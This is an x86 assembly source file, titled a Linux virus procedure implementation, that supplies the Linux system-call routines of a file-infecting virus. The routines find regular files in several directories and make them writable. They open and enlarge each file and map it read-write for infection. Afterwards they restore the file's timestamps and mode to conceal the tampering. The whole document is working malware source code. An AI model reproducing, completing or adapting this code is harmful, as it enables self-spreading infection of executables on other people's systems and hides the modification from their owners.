;= Linux Virus Procedure Implementation (c) 2013 JPanic ===================
;
; Provides Virus Operating System specific routines for Linux.
;
; PUBLICS:
;	Linux_Init()
;	Linux_FindFirst()
;	Linux_FindNext()
;	Linux_FindClose()
;	Linux_OpenFile()
;	Linux_Close()
;	Linux_Exit()
;	Linux_DirSetup
;	Linux_Chdir
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat
	
include inc\linux.inc
include inc\short.inc
include vheap.ash

extrn	SetupDirRegs:PROC
	
;= Code Warez =============================================================
        include codeseg.ash

; = Linux_Init ============================================================
;
; Must Clear CF.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_Init
Linux_Init		PROC
			xor	eax,eax
			mov	al,201
			int	80h			; geteuid()
			mov	[vheap.dwEUID],eax
			clc
			ret
Linux_Init		ENDP

; = Linux_Exit ============================================================
; Close DIR fd's.
PUBLIC	Linux_Exit
Linux_Exit		PROC
			;lea	esi,[vheap.dwDirCWD]
			lodsd
			xchg	eax,ebx
			call	$close
			lodsd
			xchg	eax,ebx
			call	$close
			lodsd
			xchg	eax,ebx
			jmp	$close
Linux_Exit		ENDP

;= Linux_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindFirst
Linux_FindFirst		PROC		
			lea	ebx,[vheap.dwDOT]	; const char *fname
			xor	ecx,ecx			; int flags
			push	L 5
			pop	eax
			cdq				; mode_t mode			
			int	80h			; - open(..)			
			cdq
			inc	edx			; 0 on error
			jz	$ret_cf
			mov	dwo [vheap.dwFindHandle],eax			
		$LinuxReadDir:			
			xchg	ebx,eax			; uint fd
			lea	ecx,[LinuxHeap.dirp]	; struct dirent *dirp
			push	L 1
			pop	edx			; count
			push	L 89
			pop	eax
			int	80h			; - readdir(..)
			xchg	eax,ecx
			jecxz	$ret_cf
			lea	ebx,[LinuxHeap.dirp.dirent_name]       ; char *fname			
			push	L 106
			pop	eax
			lea	ecx,[LinuxHeap.statbuf]	        ; struct stat *buf
			int	80h				        ; - stat(..)
			; regular files only
			mov	dx,STAT_MODE_FILETYPE_MASK
			and	edx,dwo [LinuxHeap.statbuf.stat_mode]
			cmp	dx,STAT_MODE_FILETYPE_REG
			jne	Linux_FindNext
			mov	ecx,dwo [LinuxHeap.statbuf.stat_size]
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret
Linux_FindFirst		ENDP

;= Linux_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindNext
Linux_FindNext		PROC
			mov	eax,dwo [vheap.dwFindHandle]
			jmp	$LinuxReadDir			
Linux_FindNext		ENDP

;= Linux_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindClose
Linux_FindClose		PROC
			mov	ebx,dwo [vheap.dwFindHandle]; int fd
	$close:		test	ebx,ebx
			jz	@@ret
			push	L 6
			pop	eax
			int	80h				; - close(..)
		@@ret:	ret			
Linux_FindClose		ENDP

;= Linux_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_OpenFile
Linux_OpenFile		PROC
			;and	dwo [vheap.dwSavedFMode],0
			lea	ebx,[LinuxHeap.dirp.dirent_name]; const char *fname
			movzx	ecx,[LinuxHeap.statbuf.stat_gid]
			cmp	ecx,[vheap.dwEUID]
			jne	@@nochmod
				movzx	ecx,[LinuxHeap.statbuf.stat_mode]
				mov	[vheap.dwSavedFMode],ecx
				or	cx,S_OWNER_R+S_OWNER_W
				push    L 15
				pop	eax
				int	80h		; chmod(..)
		@@nochmod:
			push	L 5
			pop	eax
			lea	ebx,[LinuxHeap.dirp.dirent_name]; const char *fname
			cdq					; mode_t mode			
			lea	ecx,[edx+2]			; int flags.)
			int     80h
                        mov	[vheap.dwFileHandle],eax
			cdq
			xchg	ebx,eax				; int fd
			inc	edx
			jz	$restore_chmod
			; ftruncate(fd,filesize+0x2000)
                        mov     ecx,[vheap.dwFileSize]                        
                        xor     edx,edx
                        mov     dh,30h
                        add     ecx,edx
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
                        mov     dh,10h
                        or      eax,eax
                        jnz     $restore_close                        
			; mmap(NULL, FileSize+4k rounded, PROT_READ+PROT_WRITE, MAP_SHARED, fd, 0)
			push ebp			
			mov	al,192							; mmap2
			mov edi,ebx							; fd
			xor	ebx,ebx							; addr
			;mov esi,L MAP_SHARED				; flags
			push	L MAP_SHARED
			pop	esi
			neg	edx
			and	ecx,edx
			mov	[vheap.dwMappedSize],ecx
			xor	ebp,ebp							; offset			
			;mov edx,L PROT_READ+PROT_WRITE		; prot
			push	L PROT_READ+PROT_WRITE
			pop	edx
			int	80h
			pop ebp
			cmp	eax,-4096
			mov	[vheap.dwMappedFile],eax
			jae	$restore_size
			clc	
			ret
Linux_OpenFile		ENDP

;= Linux_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Linux_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Linux_CloseFile
Linux_CloseFile		PROC
			; unmap dwMappedFile, dwFileSize+4096
                        push	L 91
			pop	eax
			mov	ebx,[vheap.dwMappedFile]	; void *start			
                        mov	ecx,dwo [vheap.dwMappedSize]	; size_t length
			int	80h				; - munmap(..)
	$restore_size:	; ftruncate ebx=fd,ecx=dwFillesize
                        mov     ebx,[vheap.dwFileHandle]
                        mov     ecx,[vheap.dwFileSize]
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
	$restore_close:	mov	ebx,[vheap.dwFileHandle]	; int fd
			push	L 6
			pop	eax				; - close(..)
			int	80h
			lea	ebx,[LinuxHeap.dirp.dirent_name]  ; char *fname
			lea	ecx,[LinuxHeap.statbuf.stat_atime]
			push	dwo [ecx+8]
			pop	dwo [ecx+4]
			push	L 30
			pop	eax
			int	80h				; utime(..)
	$restore_chmod:	mov	ecx,[vheap.dwSavedFMode]
			jecxz	@@nochmod
				lea	ebx,[LinuxHeap.dirp.dirent_name]  ; char *fname
				push	L 15
				pop	eax		; chmod(..)
				int	80h
		@@nochmod:
			stc
			ret
Linux_CloseFile		ENDP

;= Linux_Chdir ============================================================
;
; ebx = fd Dir
; returns CF on error.
;
;--------------------------------------------------------------------------
PUBLIC Linux_Chdir
Linux_Chdir		PROC
			xor	eax,eax
			mov	al,133
			int	80h	; fchdir(...)
			shl	eax,1	; CF on error.
			ret
Linux_Chdir		ENDP

;= Linux_DirSetup ========================================================
;
; Outputs:
;	dwCWD, dwDirA, dwDirB
;
;-------------------------------------------------------------------------
PUBLIC	Linux_DirSetup
Linux_DirSetup		PROC
			;lea	edi,[vheap.dwDirCWD]		; edi: dest
			;call	SetupDirRegs
			; ecx = CWD (.), esi = DirA, edx = DirB.
			mov	ebx,ecx
			call	OpenDir
			mov	ebx,esi
			call	OpenDir
			mov	ebx,edx
			;call	OpenDir
			;ret
Linux_DirSetup		ENDP

; ebx = path
OpenDir			PROC
			push	edx
			xor	ecx,ecx			; int flags
			push	L 5
			pop	eax
			cdq				; mode_t mode			
			int	80h			; - open(..)			
			cdq
			inc	edx			; 0 on error
			jnz	@@s
			xchg	eax,edx
		@@s:	stosd
			pop	edx
			ret
OpenDir			ENDP
;==========================================================================
                        ENDS
			END
;==========================================================================
